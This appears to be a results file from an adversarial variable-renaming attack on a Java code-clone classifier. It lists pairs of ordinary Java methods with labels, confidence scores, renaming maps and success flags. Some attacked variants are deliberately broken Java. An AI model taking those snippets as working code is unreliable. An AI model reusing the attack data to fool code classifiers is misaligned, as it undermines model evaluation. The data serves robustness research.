                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",201,"    public void testCachingEmptyFile() throws Exception {
        ByteArrayOutputStream pao = new ByteArrayOutputStream();
        WritableByteChannelurll = newChannel(pao);
        HttpParams Par = new BasicHttpParams();
        SessionOutputBuffoutputcbbuf = new SessionOutputBufferImpl(1024, 128, Par);
        HttpTransportMetricsImpl metrics = new HttpTransportMetricsImpl();
        LengthDelimitedEncodeecipherer = new LengthDelimitedEncoder(url, outputcb, metrics, 16);
        ecipher.write(wrap(""stuff;""));
        File poraryfile = File.createTempFile(""testFile"", ""txt"");
        FileOutputStream fouffilenew FileOutputStream(poraryfile);
        OutputStreamWriter wwRTouter= new OutputStreamWriter(ffile);
        wRTouter.flush();
        wRTouter.close();
        FileChannel fchpqueuenew FileInputStream(poraryfile).getChannel();
        ecipher.transfer(pqueue, 0, 20);
        ecipher.write(wrap(""more stuff""));
        Stringstrings = pao.toString(""US-ASCII"");
        assertTrue(ecipher.isCompleted());
        assertEquals(""stuff;more stuff"", string);
        poraryfile.delete();
    }
",LABEL_1,LABEL_1,0.505191445350647,1,"testCodingEmptyFile,baos,channel,params,outbuf,metrics,encoder,tmpFile,fout,wrtout,fchannel,s",,,,2,"testCodingEmptyFile:testCachingEmptyFile,baos:pao,channel:url,params:Par,outbuf:outputcb,metrics:metrics,encoder:ecipher,tmpFile:poraryfile,fout:ffile,wrtout:wRTouter,fchannel:pqueue,s:string,",1,GA,833,0.32731286287307737,ga,[]
174,"    private int[] sortRows(int[] rows) {
        for (int i = 0; i < rows.length; i++) {
            for (int j = 0; j < rows.length - 1; j++) {
                if (rows[j] > rows[j + 1]) {
                    int temp = rows[j];
                    rows[j] = rows[j + 1];
                    rows[j + 1] = temp;
                }
            }
        }
        return rows;
    }
 <SPLIT>     public void getWebByUrl(String strUrl, String charset, String fileIndex) {
        try {
            System.out.println(""Getting web by url: "" + strUrl);
            addReport(""Getting web by url: "" + strUrl + ""\n"");
            URL url = new URL(strUrl);
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            InputStream is = null;
            is = url.openStream();
            String filePath = fPath + ""/web"" + fileIndex + "".htm"";
            PrintWriter pw = null;
            FileOutputStream fos = new FileOutputStream(filePath);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            pw = new PrintWriter(writer);
            BufferedReader bReader = new BufferedReader(new InputStreamReader(is));
            StringBuffer sb = new StringBuffer();
            String rLine = null;
            String tmp_rLine = null;
            while ((rLine = bReader.readLine()) != null) {
                tmp_rLine = rLine;
                int str_len = tmp_rLine.length();
                if (str_len > 0) {
                    sb.append(""\n"" + tmp_rLine);
                    pw.println(tmp_rLine);
                    pw.flush();
                    if (deepUrls.get(strUrl) < webDepth) getUrlByString(tmp_rLine, strUrl);
                }
                tmp_rLine = null;
            }
            is.close();
            pw.close();
            System.out.println(""Get web successfully! "" + strUrl);
            addReport(""Get web successfully! "" + strUrl + ""\n"");
            addWebSuccessed();
        } catch (Exception e) {
            System.out.println(""Get web failed!       "" + strUrl);
            addReport(""Get web failed!       "" + strUrl + ""\n"");
            addWebFailed();
        }
    }
",100,,LABEL_0,LABEL_0,LABEL_0,-1,"sortRows,rows,i,j,temp",,,,0,,0,GA,1909,0.68948335647583,failed,[]
175,"    public void testImageInfo() throws MalformedURLException, IOException {
        System.out.println(""ImageInfo:"");
        long start = Calendar.getInstance().getTimeInMillis();
        for (int i = 0; i < images.length; i++) {
            String url = Constants.getDefaultURIMediaConnectorBasePath() + ""albums/hund/"" + images[i];
            InputStream istream = (new URL(url)).openStream();
            ImageInfo ii = new ImageInfo();
            ii.setInput(istream);
            assertTrue(""Not a supported image file format."", ii.check());
            int width = ii.getWidth();
            int height = ii.getHeight();
            System.out.println(width + ""x"" + height);
        }
        long stop = Calendar.getInstance().getTimeInMillis();
        System.out.println(""zeit: "" + (stop - start));
    }
 <SPLIT>     private void getRandomGUID(boolean secure) {
        MessageDigest md5 = null;
        StringBuffer sbValueBeforeMD5 = new StringBuffer();
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            System.out.println(""Error: "" + e);
        }
        try {
            long time = System.currentTimeMillis();
            long rand = 0;
            if (secure) {
                rand = mySecureRand.nextLong();
            } else {
                rand = myRand.nextLong();
            }
            sbValueBeforeMD5.append(s_id);
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(time));
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(rand));
            valueBeforeMD5 = sbValueBeforeMD5.toString();
            md5.update(valueBeforeMD5.getBytes());
            byte[] array = md5.digest();
            StringBuffer sb = new StringBuffer();
            for (int j = 0; j < array.length; ++j) {
                int b = array[j] & 0xFF;
                if (b < 0x10) sb.append('0');
                sb.append(Integer.toHexString(b));
            }
            valueAfterMD5 = sb.toString();
        } catch (Exception e) {
            System.out.println(""Error:"" + e);
        }
    }
",179,,LABEL_0,LABEL_0,LABEL_0,-1,"testImageInfo,IOException,start,i,url,istream,ii,width,height,stop",,,,0,,0,GA,3556,1.2944309035936992,failed,[]
176,"    public void test() {
        try {
            String query = ""* <http://xmlns.com/foaf/0.1/workplaceHomepage> <http://www.deri.ie/>"" + ""* <http://xmlns.com/foaf/0.1/knows> *"";
            String url = ""http://sindice.com/api/v2/search?qt=advanced&q="" + URLEncoder.encode(query, ""utf-8"") + ""&qt=advanced"";
            URL urlObj = new URL(url);
            URLConnection con = urlObj.openConnection();
            if (con != null) {
                Model model = ModelFactory.createDefaultModel();
                model.read(con.getInputStream(), null);
            }
            System.out.println(url);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     private void getRandomGUID(boolean secure) {
        MessageDigest md5 = null;
        StringBuffer sbValueBeforeMD5 = new StringBuffer();
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            System.out.println(""Error: "" + e);
        }
        try {
            long time = System.currentTimeMillis();
            long rand = 0;
            if (secure) {
                rand = mySecureRand.nextLong();
            } else {
                rand = myRand.nextLong();
            }
            sbValueBeforeMD5.append(s_id);
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(time));
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(rand));
            valueBeforeMD5 = sbValueBeforeMD5.toString();
            md5.update(valueBeforeMD5.getBytes());
            byte[] array = md5.digest();
            StringBuffer sb = new StringBuffer();
            for (int j = 0; j < array.length; ++j) {
                int b = array[j] & 0xFF;
                if (b < 0x10) sb.append('0');
                sb.append(Integer.toHexString(b));
            }
            valueAfterMD5 = sb.toString();
        } catch (Exception e) {
            System.out.println(""Error:"" + e);
        }
    }
",127,,LABEL_0,LABEL_0,LABEL_0,-1,"test,query,url,urlObj,con,model",,,,0,,0,GA,1922,0.7006607214609782,failed,[]
177,"    public String put(String resourceID, Map<String, String> headersMap) {
        HttpClient httpClient = new DefaultHttpClient();
        httpClient.getParams().setParameter(""http.useragent"", ""sla@soi OCCI Client v0.2"");
        HttpPut httpPut = new HttpPut(resourceID);
        List<Header> headersList = this.convert2Headers(headersMap);
        for (Iterator<Header> iterator = headersList.iterator(); iterator.hasNext(); ) {
            httpPut.addHeader(iterator.next());
        }
        logger.info(httpPut.getRequestLine());
        logger.info(httpPut.getAllHeaders());
        Header[] headersArray = httpPut.getAllHeaders();
        String[] fields = { Response.Location };
        HashMap<String, String> occiHeaders = new HashMap<String, String>();
        for (int H = 0; H < headersArray.length; H++) {
            Header header = headersArray[H];
            logger.info(""header - request  -"" + header.toString());
            logger.info(""	headerName - "" + header.getName());
            logger.info(""	headerValue - "" + header.getValue());
        }
        String statusLine = null;
        try {
            HttpResponse httpResponse = httpClient.execute(httpPut);
            statusLine = httpResponse.getStatusLine().toString();
            int statusCode = httpResponse.getStatusLine().getStatusCode();
            logger.info(""----------------------------------------"");
            logger.info(""StatusLine - (full) - "" + httpResponse.getStatusLine());
            logger.info(""	StatusCode - "" + statusCode);
            logger.info(""	Reason - "" + httpResponse.getStatusLine().getReasonPhrase());
            logger.info(""	Protocol - "" + httpResponse.getStatusLine().getProtocolVersion().toString());
            logger.info(""----------------------------------------"");
            if (StatusCode.validate(statusCode)) {
                logger.info(""Response Validated"");
            } else {
                logger.error(""Response NOT Validated"");
                return null;
            }
            Header[] headers = httpResponse.getAllHeaders();
            for (int i = 0; i < headers.length; i++) {
                Header header = headers[i];
                logger.info(""header - response - "" + header.toString());
                logger.info(""	headerName - "" + header.getName());
                logger.info(""	headerValue - "" + header.getValue());
                for (int h = 0; h < fields.length; h++) {
                    logger.info(""	Looking for  - "" + fields[h]);
                    if (fields[h].equals(header.getName().toString())) {
                        logger.info(""	Found an OCCI Header - "" + header.getName());
                        occiHeaders.put(header.getName(), header.getValue());
                    }
                }
            }
        } catch (org.apache.http.conn.HttpHostConnectException e) {
            e.printStackTrace();
            logger.error(e);
            return null;
        } catch (ClientProtocolException e) {
            e.printStackTrace();
            logger.error(e);
            return null;
        } catch (IOException e) {
            e.printStackTrace();
            logger.error(e);
            return null;
        } finally {
            httpClient.getConnectionManager().shutdown();
        }
        logger.info(""occiHeaders - "" + occiHeaders);
        if (occiHeaders.containsKey(Response.Location)) {
            logger.info(""Valid Provision"" + statusLine);
            return occiHeaders.get(Response.Location).toString().replaceAll(Response.jobs, """");
        }
        logger.info(""NOT a Valid Provision - "" + statusLine);
        return statusLine;
    }
 <SPLIT>     public static void main(String[] argv) {
        if (1 < argv.length) {
            File[] sources = Source(argv[0]);
            if (null != sources) {
                for (File src : sources) {
                    File[] targets = Target(src, argv);
                    if (null != targets) {
                        final long srclen = src.length();
                        try {
                            FileChannel source = new FileInputStream(src).getChannel();
                            try {
                                for (File tgt : targets) {
                                    FileChannel target = new FileOutputStream(tgt).getChannel();
                                    try {
                                        source.transferTo(0L, srclen, target);
                                    } finally {
                                        target.close();
                                    }
                                    System.out.printf(""Updated %s\n"", tgt.getPath());
                                    File[] deletes = Delete(src, tgt);
                                    if (null != deletes) {
                                        for (File del : deletes) {
                                            if (SVN) {
                                                if (SvnDelete(del)) System.out.printf(""Deleted %s\n"", del.getPath()); else System.out.printf(""Failed to delete %s\n"", del.getPath());
                                            } else if (del.delete()) System.out.printf(""Deleted %s\n"", del.getPath()); else System.out.printf(""Failed to delete %s\n"", del.getPath());
                                        }
                                    }
                                    if (SVN) SvnAdd(tgt);
                                }
                            } finally {
                                source.close();
                            }
                        } catch (Exception exc) {
                            exc.printStackTrace();
                            System.exit(1);
                        }
                    }
                }
                System.exit(0);
            } else {
                System.err.printf(""Source file(s) not found in '%s'\n"", argv[0]);
                System.exit(1);
            }
        } else {
            usage();
            System.exit(1);
        }
    }
",727,"    public String put(String serviceId, Map<String, String> headersMap) {
        HttpClient httpClient = new DefaultHttpClient();
        httpClient.getParams().setParameter(""http.useragent"", ""sla@soi OCCI Client v0.2"");
        HttpPuthttpPutt = new HttpPut(serviceId);
        List<Header> headersList = this.convert2Headers(headersMap);
        for (Iterator<Header> iterator = headersList.iterator(); iterator.hasNext(); ) {
            httpPut.addHeader(iterator.next());
        }
        logger.info(httpPut.getRequestLine());
        logger.info(httpPut.getAllHeaders());
        Header[] headersArray = httpPut.getAllHeaders();
        String[] fields = { Response.Location };
        HashMap<String, String> occiHeaders = new HashMap<String, String>();
        for (int H = 0; H < headersArray.length; H++) {
            Header file = headersArray[H];
            logger.info(""header - request  -"" + file.toString());
            logger.info(""	headerName - "" + file.getName());
            logger.info(""	headerValue - "" + file.getValue());
        }
        String statusLine = null;
        try {
            HttpResponse httpResponse = httpClient.execute(httpPut);
            statusLine = httpResponse.getStatusLine().toString();
            int statusCode = httpResponse.getStatusLine().getStatusCode();
            logger.info(""----------------------------------------"");
            logger.info(""StatusLine - (full) - "" + httpResponse.getStatusLine());
            logger.info(""	StatusCode - "" + statusCode);
            logger.info(""	Reason - "" + httpResponse.getStatusLine().getReasonPhrase());
            logger.info(""	Protocol - "" + httpResponse.getStatusLine().getProtocolVersion().toString());
            logger.info(""----------------------------------------"");
            if (StatusCode.validate(statusCode)) {
                logger.info(""Response Validated"");
            } else {
                logger.error(""Response NOT Validated"");
                return null;
            }
            Header[] headers = httpResponse.getAllHeaders();
            for (int i = 0; i < headers.length; i++) {
                Header file = headers[i];
                logger.info(""header - response - "" + file.toString());
                logger.info(""	headerName - "" + file.getName());
                logger.info(""	headerValue - "" + file.getValue());
                for (int h = 0; h < fields.length; h++) {
                    logger.info(""	Looking for  - "" + fields[h]);
                    if (fields[h].equals(file.getName().toString())) {
                        logger.info(""	Found an OCCI Header - "" + file.getName());
                        occiHeaders.put(file.getName(), file.getValue());
                    }
                }
            }
        } catch (org.apache.http.conn.HttpHostConnectException e) {
            e.printStackTrace();
            logger.error(e);
            return null;
        } catch (ClientProtocolException e) {
            e.printStackTrace();
            logger.error(e);
            return null;
        } catch (IOException e) {
            e.printStackTrace();
            logger.error(e);
            return null;
        } finally {
            httpClient.getConnectionManager().shutdown();
        }
        logger.info(""occiHeaders - "" + occiHeaders);
        if (occiHeaders.containsKey(Response.Location)) {
            logger.info(""Valid Provision"" + statusLine);
            return occiHeaders.get(Response.Location).toString().replaceAll(Response.jobs, """");
        }
        logger.info(""NOT a Valid Provision - "" + statusLine);
        return statusLine;
    }
",LABEL_0,LABEL_0,0.5653725862503052,1,"put,resourceID,headersMap,httpClient,httpPut,headersList,iterator,headersArray,fields,occiHeaders,H,header,statusLine,httpResponse,statusCode",,,,52,"put:put,resourceID:serviceId,headersMap:headersMap,httpClient:httpClient,httpPut:httpPut,headersList:headersList,iterator:iterator,headersArray:headersArray,fields:fields,occiHeaders:occiHeaders,H:H,header:file,statusLine:statusLine,httpResponse:httpResponse,statusCode:statusCode,",13,GA,583,0.24297510782877604,ga,[]
178,"    @Override
    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        InputStream is = null;
        InputStream page = null;
        OutputStream os = null;
        String rootUrl = null;
        try {
            boolean isMultipart = ServletFileUpload.isMultipartContent(request);
            if (!isMultipart) {
                request.setAttribute(""error"", ""Form isn't a multipart form"");
                RequestDispatcher rd = request.getRequestDispatcher(""/WEB-INF/error.jsp"");
                rd.forward(request, response);
            }
            ServletFileUpload upload = new ServletFileUpload();
            String webUrl = null;
            FileItemIterator iter = upload.getItemIterator(request);
            while (iter.hasNext()) {
                FileItemStream item = iter.next();
                String name = item.getFieldName();
                if (name.equals(""webpage"")) {
                    is = item.openStream();
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    IOUtils.copy(is, baos);
                    page = new ByteArrayInputStream(baos.toByteArray());
                } else if (name.equals(""weburl"")) {
                    InputStream wpIs = null;
                    try {
                        webUrl = Streams.asString(item.openStream());
                        URL u = new URL(webUrl);
                        wpIs = new BufferedInputStream(u.openStream());
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        IOUtils.copy(wpIs, baos);
                        page = new ByteArrayInputStream(baos.toByteArray());
                    } finally {
                        IOUtils.closeQuietly(wpIs);
                    }
                } else if (name.equals(""rooturl"")) {
                    rootUrl = Streams.asString(item.openStream());
                }
            }
            if (page == null) {
                request.setAttribute(""error"", ""Form doesn't have an html file"");
                RequestDispatcher rd = request.getRequestDispatcher(""/WEB-INF/error.jsp"");
                rd.forward(request, response);
            }
            ToMailerDelegate delegate = new ToMailerDelegate(page, rootUrl);
            os = new BufferedOutputStream(response.getOutputStream());
            os.write(delegate.getMailer());
            os.flush();
        } catch (Exception e) {
            streamException(request, response, e);
        } finally {
            IOUtils.closeQuietly(page);
            IOUtils.closeQuietly(is);
            IOUtils.closeQuietly(os);
        }
    }
 <SPLIT>     public void runDynusT(final boolean cleanUp) {
        final String[] exeFiles = new String[] { ""DynusT.exe"", ""DLL_ramp.dll"", ""Ramp_Meter_Fixed_CDLL.dll"", ""Ramp_Meter_Feedback_CDLL.dll"", ""Ramp_Meter_Feedback_FDLL.dll"", ""libifcoremd.dll"", ""libmmd.dll"", ""Ramp_Meter_Fixed_FDLL.dll"", ""libiomp5md.dll"" };
        final String[] modelFiles = new String[] { ""network.dat"", ""scenario.dat"", ""control.dat"", ""ramp.dat"", ""incident.dat"", ""movement.dat"", ""vms.dat"", ""origin.dat"", ""destination.dat"", ""StopCap4Way.dat"", ""StopCap2Way.dat"", ""YieldCap.dat"", ""WorkZone.dat"", ""GradeLengthPCE.dat"", ""leftcap.dat"", ""system.dat"", ""output_option.dat"", ""bg_demand_adjust.dat"", ""xy.dat"", ""TrafficFlowModel.dat"", ""parameter.dat"" };
        log.info(""Creating iteration-directory..."");
        File iterDir = new File(this.tmpDir);
        if (!iterDir.exists()) {
            iterDir.mkdir();
        }
        log.info(""Copying application files to iteration-directory..."");
        for (String filename : exeFiles) {
            log.info(""  Copying "" + filename);
            IOUtils.copyFile(new File(this.dynusTDir + ""/"" + filename), new File(this.tmpDir + ""/"" + filename));
        }
        log.info(""Copying model files to iteration-directory..."");
        for (String filename : modelFiles) {
            log.info(""  Copying "" + filename);
            IOUtils.copyFile(new File(this.modelDir + ""/"" + filename), new File(this.tmpDir + ""/"" + filename));
        }
        for (File f : new File(this.modelDir).listFiles()) {
            if (f.getName().toLowerCase(Locale.ROOT).endsWith("".dws"")) {
                log.info(""  Copying "" + f.getName());
                IOUtils.copyFile(f, new File(this.tmpDir + ""/"" + f.getName()));
            }
        }
        String logfileName = this.tmpDir + ""/dynus-t.log"";
        String cmd = this.tmpDir + ""/DynusT.exe"";
        log.info(""running command: "" + cmd + "" in directory "" + this.tmpDir);
        int timeout = 7200;
        int exitcode = ExeRunner.run(cmd, logfileName, timeout, this.tmpDir);
        if (exitcode != 0) {
            throw new RuntimeException(""There was a problem running Dynus-T. exit code: "" + exitcode);
        }
        if (cleanUp) {
            for (String filename : exeFiles) {
                log.info(""  Deleting "" + filename);
                new File(this.tmpDir + ""/"" + filename).delete();
            }
        }
    }
",438,,LABEL_1,LABEL_1,LABEL_1,-1,"doPost,request,response,is,page,os,rootUrl,isMultipart,rd,upload,webUrl,iter,item,name,baos,wpIs,u",,,,0,,0,GA,6303,2.52072944243749,failed,[]
179,"    public static String checksum(URL url, String algorithm) {
        MessageDigest messageDigest;
        try {
            messageDigest = MessageDigest.getInstance(algorithm);
        } catch (Exception ex) {
            throw new RuntimeException(""Could not create an instance of MessageDigest"", ex);
        }
        byte[] bytes = new byte[4 * 1024];
        try {
            InputStream in = null;
            try {
                in = url.openStream();
                int nBytesRead = 0;
                while ((nBytesRead = in.read(bytes)) > 0) {
                    messageDigest.update(bytes, 0, nBytesRead);
                }
            } finally {
                if (in != null) {
                    in.close();
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(""Could not read message digest for: "" + url.toExternalForm() + "" using algorithm: "" + algorithm);
        }
        byte[] checksumValue = messageDigest.digest();
        return digestAsString(checksumValue);
    }
 <SPLIT>     public void readUNI(Vector<String> descriptions, String source) {
        InputStream is = null;
        try {
            URL url = new URL(source);
            is = url.openStream();
            Scanner scanner = new Scanner(is);
            scanner.nextLine();
            String line = """";
            String id = """";
            String desc = """";
            while (scanner.hasNextLine()) {
                line = scanner.nextLine();
                Scanner linescanner = new Scanner(line);
                linescanner.useDelimiter(""\t"");
                id = linescanner.next();
                linescanner.next();
                desc = linescanner.next();
                linescanner.useDelimiter(""\n"");
                linescanner.next();
                descriptions.add(id + "" "" + desc);
            }
        } catch (MalformedURLException e) {
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (is != null) try {
                is.close();
            } catch (IOException e) {
            }
        }
    }
",174,,LABEL_0,LABEL_0,LABEL_0,-1,"checksum,url,algorithm,messageDigest,bytes,in,nBytesRead,checksumValue",,,,0,,0,GA,2971,1.0735925714174905,failed,[]
180,"    public static void copy(File sourceFile, File destinationFile) {
        try {
            if (((sourceFile == null) && (destinationFile == null)) || ((sourceFile == null) || (destinationFile == null))) {
                System.out.println(""sourceFile & destinationFile is null"");
                System.exit(-1);
            }
            if (sourceFile.isDirectory()) {
                File[] tmp = sourceFile.listFiles();
                File f;
                for (int i = 0; i < tmp.length; i++) {
                    f = new File(destinationFile.getAbsolutePath() + File.separator + tmp[i].getName());
                    f.getParentFile().mkdirs();
                    copy(tmp[i], f);
                }
            } else {
                System.out.println(""\nCopy from: "" + sourceFile + ""\n\n     to: "" + destinationFile);
                FileChannel source = new FileInputStream(sourceFile).getChannel();
                FileChannel destination = new FileOutputStream(destinationFile).getChannel();
                destination.transferFrom(source, 0, source.size());
                source.close();
                destination.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     public static void main(final String[] args) throws RecognitionException, TokenStreamException, IOException, IllegalOptionValueException, UnknownOptionException {
        try {
            CmdLineParser cmdLineParser = new CmdLineParser();
            Option formatOption = cmdLineParser.addStringOption('f', ""format"");
            Option outputEncodingOption = cmdLineParser.addStringOption('c', ""outcharset"");
            Option inputEncodingOption = cmdLineParser.addStringOption('i', ""incharset"");
            cmdLineParser.parse(args);
            String format = (String) cmdLineParser.getOptionValue(formatOption);
            String outputEncoding = (String) cmdLineParser.getOptionValue(outputEncodingOption);
            if (outputEncoding == null || outputEncoding.trim().equals("""")) {
                outputEncoding = ""utf-8"";
                System.out.println(""Defaulting to output charset utf-8 as argument -c is missing or not valid."");
            }
            String inputEncoding = (String) cmdLineParser.getOptionValue(inputEncodingOption);
            if (inputEncoding == null || outputEncoding.trim().equals("""")) {
                inputEncoding = ""utf-8"";
                System.out.println(""Defaulting to input charset utf-8 as argument -i is missing or not valid."");
            }
            String[] remainingArgs = cmdLineParser.getRemainingArgs();
            if (remainingArgs.length != 2) {
                printUsage(""Input and output file are not specified correctly. "");
            }
            File inputFile = new File(remainingArgs[0]);
            if (!inputFile.exists()) {
                printUsage(""Input file "" + remainingArgs[0] + "" does not exist. "");
            }
            if (format == null || format.trim().equals("""")) {
                format = (String) FileUtil.cutExtension(inputFile.getName()).getValue();
            }
            File outputFile = new File(remainingArgs[1]);
            if (!outputFile.exists()) {
                outputFile.createNewFile();
            }
            System.out.println(""format detected: "" + format);
            if (""html"".equals(format)) {
                Reader reader = new HtmlEntityDecoderReader(new InputStreamReader(new FileInputStream(inputFile), inputEncoding));
                OutputStreamWriter out = new OutputStreamWriter(new FileOutputStream(outputFile), outputEncoding);
                char[] buffer = new char[1024];
                int read;
                do {
                    read = reader.read(buffer);
                    if (read > 0) {
                        out.write(buffer, 0, read);
                    }
                } while (read != -1);
                out.flush();
                out.close();
            } else {
                printUsage(""Format not specified via argument -f. Also guessing for the extension of input file "" + inputFile.getName() + "" failed"");
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            printUsage(ex.getMessage());
        }
    }
",243,,LABEL_1,LABEL_1,LABEL_1,-1,"copy,sourceFile,destinationFile,tmp,f,i,source,destination",,,,0,,0,GA,2905,1.1057413895924886,failed,[]
181,"    private void getRandomGUID(boolean secure) {
        MessageDigest md5 = null;
        StringBuffer sbValueBeforeMD5 = new StringBuffer();
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            System.out.println(""Error: "" + e);
        }
        try {
            long time = System.currentTimeMillis();
            long rand = 0;
            if (secure) {
                rand = mySecureRand.nextLong();
            } else {
                rand = myRand.nextLong();
            }
            sbValueBeforeMD5.append(s_id);
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(time));
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(rand));
            valueBeforeMD5 = sbValueBeforeMD5.toString();
            md5.update(valueBeforeMD5.getBytes());
            byte[] array = md5.digest();
            StringBuffer sb = new StringBuffer();
            for (int j = 0; j < array.length; ++j) {
                int b = array[j] & 0xFF;
                if (b < 0x10) sb.append('0');
                sb.append(Integer.toHexString(b));
            }
            valueAfterMD5 = sb.toString();
        } catch (Exception e) {
            System.out.println(""Error:"" + e);
        }
    }
 <SPLIT>     public static boolean isCodebaseDownloadable(Properties p) {
        class CodebaseData {

            String file;

            boolean success = true;
        }
        String codebase = p.getProperty(""java.rmi.server.codebase"", null);
        if (null == codebase) {
            if (logger.isDebugEnabled()) logger.debug(""java.rmi.server.codebase = null (return false)"");
            return false;
        }
        try {
            URL cbUrl = new URL(codebase);
            String protocol = cbUrl.getProtocol();
            String filename = cbUrl.getFile();
            if (logger.isDebugEnabled()) {
                logger.debug(""Verifying java.rmi.server.codebase setting(s)..."");
                logger.debug(""Codebase = "" + cbUrl.toString());
            }
            if (protocol.equals(""http"")) {
                if (filename.indexOf(""http"") == -1) {
                    try {
                        int size = cbUrl.openConnection().getContentLength();
                        if (logger.isDebugEnabled()) logger.debug(""Checking "" + cbUrl + "" : OK"");
                        return true;
                    } catch (IOException e) {
                        if (logger.isDebugEnabled()) logger.debug(""Checking "" + cbUrl + "" : FAIL"");
                        return false;
                    } finally {
                        if (logger.isDebugEnabled()) logger.debug(""Verifying java.rmi.server.codebase setting(s)... Done!"");
                    }
                } else {
                    ArrayList files = new ArrayList();
                    StringTokenizer st = new StringTokenizer(codebase);
                    URL url = null;
                    String part = null;
                    CodebaseData data = null;
                    while (st.hasMoreTokens()) {
                        part = st.nextToken();
                        url = new URL(part);
                        data = new CodebaseData();
                        try {
                            int len = url.openConnection().getContentLength();
                            if (len == -1) {
                                data.success = false;
                                data.file = part;
                            } else {
                                data.file = part;
                            }
                        } catch (IOException e) {
                            data.success = false;
                        }
                        files.add(data);
                    }
                    String wrong = null;
                    CodebaseData codebaseData = null;
                    boolean allOK = true;
                    int errorFiles = 0;
                    for (int i = 0; i < files.size(); i++) {
                        codebaseData = (CodebaseData) files.get(i);
                        if (!codebaseData.success) {
                            wrong += "" "" + codebaseData.file;
                            ++errorFiles;
                            allOK = false;
                        }
                        if (logger.isDebugEnabled()) logger.debug((i + 1) + "". Checking "" + codebaseData.file + "" : "" + (codebaseData.success ? ""OK"" : ""FAIL""));
                    }
                    if (errorFiles == 0) {
                        if (logger.isDebugEnabled()) logger.debug(""All entries can be downloaded successfully!"");
                    } else {
                        logger.error(errorFiles + "" of "" + files.size() + "" entries can *not* be downloaded successfully!"");
                    }
                    if (logger.isDebugEnabled()) logger.debug(""Verifying java.rmi.server.codebase setting(s)... Done!"");
                    if (allOK) {
                        return true;
                    } else {
                        return false;
                    }
                }
            } else if (protocol.equalsIgnoreCase(""file"")) {
                if (logger.isDebugEnabled()) logger.debug(""'file' protocol not supported for JSF"");
            }
        } catch (MalformedURLException e) {
            logger.debug(e.getMessage());
            return false;
        }
        return false;
    }
",267,,LABEL_0,LABEL_0,LABEL_0,-1,"getRandomGUID,secure,md5,sbValueBeforeMD5,time,rand,valueBeforeMD5,array,sb,j,b,valueAfterMD5",,,,0,,0,GA,4481,1.7388902346293131,failed,[]
182,"    public static void copy(File sourceFile, File destinationFile) {
        try {
            if (((sourceFile == null) && (destinationFile == null)) || ((sourceFile == null) || (destinationFile == null))) {
                System.out.println(""sourceFile & destinationFile is null"");
                System.exit(-1);
            }
            if (sourceFile.isDirectory()) {
                File[] tmp = sourceFile.listFiles();
                File f;
                for (int i = 0; i < tmp.length; i++) {
                    f = new File(destinationFile.getAbsolutePath() + File.separator + tmp[i].getName());
                    f.getParentFile().mkdirs();
                    copy(tmp[i], f);
                }
            } else {
                System.out.println(""\nCopy from: "" + sourceFile + ""\n\n     to: "" + destinationFile);
                FileChannel source = new FileInputStream(sourceFile).getChannel();
                FileChannel destination = new FileOutputStream(destinationFile).getChannel();
                destination.transferFrom(source, 0, source.size());
                source.close();
                destination.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     public void testReadPerMemberSixSmall() throws IOException {
        GZIPMembersInputStream gzin = new GZIPMembersInputStream(new ByteArrayInputStream(sixsmall_gz));
        gzin.setEofEachMember(true);
        for (int i = 0; i < 3; i++) {
            int count2 = IOUtils.copy(gzin, new NullOutputStream());
            assertEquals(""wrong 1-byte member count"", 1, count2);
            gzin.nextMember();
            int count3 = IOUtils.copy(gzin, new NullOutputStream());
            assertEquals(""wrong 5-byte member count"", 5, count3);
            gzin.nextMember();
        }
        int countEnd = IOUtils.copy(gzin, new NullOutputStream());
        assertEquals(""wrong eof count"", 0, countEnd);
    }
",243,,LABEL_1,LABEL_1,LABEL_1,-1,"copy,sourceFile,destinationFile,tmp,f,i,source,destination",,,,0,,0,GA,3063,1.1121417919794718,failed,[]
183,"    @Override
    public List<SearchResult> search(String query, SortOrder order, int maxResults) throws Exception {
        if (query == null) {
            return null;
        }
        String encodedQuery = """";
        try {
            encodedQuery = URLEncoder.encode(query, ""UTF-8"");
        } catch (UnsupportedEncodingException e) {
            throw e;
        }
        final int startAt = 0;
        final int pageNr = (startAt - 1) / 30;
        final String url = String.format(QUERYURL, encodedQuery, String.valueOf(pageNr), (order == SortOrder.BySeeders ? SORT_SEEDS : SORT_COMPOSITE));
        HttpParams httpparams = new BasicHttpParams();
        HttpConnectionParams.setConnectionTimeout(httpparams, CONNECTION_TIMEOUT);
        HttpConnectionParams.setSoTimeout(httpparams, CONNECTION_TIMEOUT);
        DefaultHttpClient httpclient = new DefaultHttpClient(httpparams);
        httpclient.getParams().setParameter(""http.useragent"", ""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2"");
        HttpGet httpget = new HttpGet(url);
        HttpResponse response = httpclient.execute(httpget);
        InputStream instream = response.getEntity().getContent();
        String html = HttpHelper.ConvertStreamToString(instream);
        instream.close();
        return parseHtml(html);
    }
 <SPLIT>     @SuppressWarnings(""unchecked"")
